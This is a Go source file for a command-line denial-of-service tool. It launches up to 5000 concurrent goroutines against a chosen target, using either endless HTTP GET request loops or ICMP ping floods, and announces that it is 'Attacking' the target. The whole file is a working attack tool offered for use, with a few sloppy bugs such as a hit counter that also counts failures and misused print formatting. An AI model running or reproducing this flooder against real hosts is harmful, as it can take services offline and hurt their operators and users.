package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"sync"
	"strings"
	"github.com/sparrc/go-ping"
)

var (
	wg sync.WaitGroup
	mutex sync.Mutex
	successfulHits int
	missedHits int
)

const (
	threadLimit = 5000
	icmp = "icmp"
	httpGet = "httpget"
)

func main() {
	method, target, threads := parseArgs()

	fmt.Println("Press CTRL + C to quit")
	fmt.Println()
	fmt.Println("Attacking " + target + "...")
	
	for i := 0; i < threads; i++ {
		wg.Add(1)

		switch method {
			case icmp:
				go icmpFlood(target, &wg)
			case httpGet:
				go httpGetFlood(target, &wg)
			default: 
				fmt.Println("Method chosen not available")
				os.Exit(1)
		}
	}
	wg.Wait()
}

func parseArgs() (method string, target string, numbOfThreads int) {
	if len(os.Args) != 4 {
		fmt.Println("Error: Wrong arguements passed")
		fmt.Println()
		fmt.Println(`Usage: <method> <target> <threads>`)
		
		fmt.Println(`Example: www.mysite.com 100`)
		fmt.Println()

		os.Exit(1)
	}
	// Parsed args
	method = strings.ToLower(os.Args[1])
	target = os.Args[2]
	numbOfThreads, _ = strconv.Atoi(os.Args[3])

	if (areNumberOfThreadsValid(numbOfThreads)) == false {
		fmt.Println("Error: The number of threads you enter exceeds the limit; ", threadLimit)
		os.Exit(1)
	}
	return method, target, numbOfThreads
}

func areNumberOfThreadsValid(threads int) bool {
	threads = int(threads)

	if threads > threadLimit {
		return false
	}
	return true
}

func httpGetFlood(target string, wg *sync.WaitGroup) {
	for {
		_, err := http.Get(target)

		if err != nil {				 // Server could be down as failed to get a response from host. 
			mutex.Lock()
			missedHits++
			fmt.Print(missedHits, " missed hits \r")
			mutex.Unlock()
		}

		{
			mutex.Lock()
			successfulHits++
			fmt.Print(successfulHits, " direct hits \r")
			mutex.Unlock()
		}
	}
	wg.Done()
}

func icmpFlood(target string, wg *sync.WaitGroup) {
	pinger, err := ping.NewPinger(target)

	if err != nil {
		fmt.Println("Failed to get a response from host")
	}

	pinger.Count = 10000 					// Packets to send
	pinger.Size = 127						// 127 bytes in size
	pinger.Run()         					// Blocks until complete

	stats := pinger.Statistics()
	fmt.Print("%d sent - %d packet loss", stats.PacketsSent, stats.PacketLoss)

	wg.Done() 								// Decrement thread counter once complete
	fmt.Println("Ping Complete.")
}
